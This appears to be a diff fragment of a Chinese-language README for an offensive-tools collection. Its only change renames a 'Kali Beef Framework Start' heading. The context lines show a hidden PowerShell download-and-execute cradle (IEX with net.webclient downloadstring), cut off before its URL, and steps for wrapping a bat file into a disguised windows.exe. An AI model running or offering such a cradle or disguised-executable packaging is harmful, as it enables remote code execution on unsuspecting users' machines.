@@ -78,4 +78,4 @@ powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring
 转换bat保存为`windows.exe`,编辑`windows.bat`嵌入添加`windows.exe`重新转换为最终成品windows.exe
 
 ## kali_beef_start
-Kali Beef Framework Start
+Kali Beef Framework Start Script
